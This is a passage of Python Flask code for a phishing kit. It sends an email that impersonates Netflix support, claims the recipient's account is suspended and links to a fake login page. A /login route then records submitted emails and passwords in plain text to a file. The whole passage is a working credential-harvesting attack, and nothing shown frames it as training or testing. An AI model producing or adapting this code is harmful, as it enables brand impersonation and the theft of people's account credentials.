    to_email = 'your.email@example.com'
    subject = "Security Alert: Your Account Has Been Compromised"
    body = """Your Netflix account has been suspended for suspicious activity. Click here to log in and restore access: http://localhost:5000"""
    message = f"""From: Netflix <support@netflix.com>
Subject: {subject}
{body}
"""
    server.sendmail('phishing@example.com', to_email, message)
    server.quit()

@app.route('/')
def phishing_page():
    return render_template('phishing.html')

@app.route('/login', methods=['POST'])
def capture_credentials():
    email = request.form.get('email')
    password = request.form.get('password')
    with open('phishing_data.txt', 'a') as f:
        f.write(f"Email: {email}\nPassword: {password}\n\n")
    return "Thank you for your input!"

if __name__ == "__main__":
    send_phishing_email()
    app.run(debug=True)
```

